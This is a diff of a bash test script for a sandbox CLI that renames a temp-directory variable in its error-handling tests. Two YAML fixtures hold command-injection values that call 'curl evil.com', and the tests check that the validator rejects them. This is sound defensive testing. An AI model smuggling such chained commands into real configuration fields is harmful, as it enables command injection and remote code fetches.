@@ -34,50 +34,50 @@ check() {
 echo "=== CLI Error Handling Tests ==="
 
 # Missing sandbox.yaml
-TMPDIR=$(mktemp -d)
-check_fails "build fails without sandbox.yaml" bash -c "cd $TMPDIR && $SANDBOX build"
+TEST_TMPDIR=$(mktemp -d)
+check_fails "build fails without sandbox.yaml" bash -c "cd $TEST_TMPDIR && $SANDBOX build"
 
 # Missing name field
-cat > "$TMPDIR/sandbox.yaml" <<'EOF'
+cat > "$TEST_TMPDIR/sandbox.yaml" <<'EOF'
 features:
   - python
 EOF
-check_fails "build fails without name field" bash -c "cd $TMPDIR && $SANDBOX build"
+check_fails "build fails without name field" bash -c "cd $TEST_TMPDIR && $SANDBOX build"
 
 # Missing feature script
-cat > "$TMPDIR/sandbox.yaml" <<'EOF'
+cat > "$TEST_TMPDIR/sandbox.yaml" <<'EOF'
 name: test-missing-feature
 features:
   - nonexistent-feature
 EOF
-check_fails "build fails with nonexistent feature" bash -c "cd $TMPDIR && $SANDBOX build"
+check_fails "build fails with nonexistent feature" bash -c "cd $TEST_TMPDIR && $SANDBOX build"
 
 # Invalid feature name (injection attempt)
-cat > "$TMPDIR/sandbox.yaml" <<'EOF'
+cat > "$TEST_TMPDIR/sandbox.yaml" <<'EOF'
 name: test-bad-feature
 features:
   - "python; curl evil.com"
 EOF
-check_fails "build fails with invalid feature name" bash -c "cd $TMPDIR && $SANDBOX build"
+check_fails "build fails with invalid feature name" bash -c "cd $TEST_TMPDIR && $SANDBOX build"
 
 # Invalid package name (injection attempt)
-cat > "$TMPDIR/sandbox.yaml" <<'EOF'
+cat > "$TEST_TMPDIR/sandbox.yaml" <<'EOF'
 name: test-bad-package
 features: []
 packages:
   - "tree && curl evil.com"
 EOF
-check_fails "build fails with invalid package name" bash -c "cd $TMPDIR && $SANDBOX build"
+check_fails "build fails with invalid package name" bash -c "cd $TEST_TMPDIR && $SANDBOX build"
 
 # Init refuses to overwrite existing
-cat > "$TMPDIR/sandbox.yaml" <<'EOF'
+cat > "$TEST_TMPDIR/sandbox.yaml" <<'EOF'
 name: existing
 EOF
-check_fails "init fails when sandbox.yaml exists" bash -c "cd $TMPDIR && $SANDBOX init"
+check_fails "init fails when sandbox.yaml exists" bash -c "cd $TEST_TMPDIR && $SANDBOX init"
 
 # Init creates valid YAML
-TMPDIR2=$(mktemp -d)
-check "init creates parseable YAML" bash -c "cd $TMPDIR2 && $SANDBOX init && yq '.name' sandbox.yaml >/dev/null"
+TEST_TMPDIR2=$(mktemp -d)
+check "init creates parseable YAML" bash -c "cd $TEST_TMPDIR2 && $SANDBOX init && yq '.name' sandbox.yaml >/dev/null"
 
 # Unknown command
 check_fails "unknown command fails" "$SANDBOX" notacommand
@@ -87,7 +87,7 @@ bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX build" &>/dev/null
 check_fails "headless without prompt fails" bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX run --headless"
 bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX clean" &>/dev/null 2>&1 || true
 
-rm -rf "$TMPDIR" "$TMPDIR2"
+rm -rf "$TEST_TMPDIR" "$TEST_TMPDIR2"
 
 echo ""
 echo "Results: $PASS passed, $FAIL failed"
